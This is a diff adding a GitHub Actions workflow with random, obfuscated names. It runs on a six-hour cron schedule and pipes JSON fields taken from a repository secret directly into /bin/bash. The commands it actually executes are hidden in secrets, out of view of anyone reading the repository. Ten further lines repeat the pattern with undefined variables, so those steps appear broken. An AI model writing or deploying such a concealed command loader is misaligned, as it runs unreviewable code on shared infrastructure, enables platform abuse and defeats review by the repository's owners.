@@ -1,0 +1,28 @@
+name: kutimeixue
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kutimeixue
+        env:
+          qqhdg84829: ${{ secrets.qqhdg84829 }}
+        run: |
+          echo $qqhdg84829 | jq -r .ztezc27 | /bin/bash
+          echo $cg3080 | jq -r .smxfn7320 | /bin/bash
+          echo $jsuk6764 | jq -r .dm7 | /bin/bash
+          echo $yxgne1 | jq -r .wajya2439 | /bin/bash
+          echo $sz1994 | jq -r .nppuh01299 | /bin/bash
+          echo $s46 | jq -r .bwhz96 | /bin/bash
+          echo $ixj41 | jq -r .yd4611 | /bin/bash
+          echo $qd429 | jq -r .wayrb87960 | /bin/bash
+          echo $kgcpr21 | jq -r .bnrbg628 | /bin/bash
+          echo $ngjod24236 | jq -r .wnoqv9399 | /bin/bash
+          echo $v1 | jq -r .mnoyt6 | /bin/bash
+
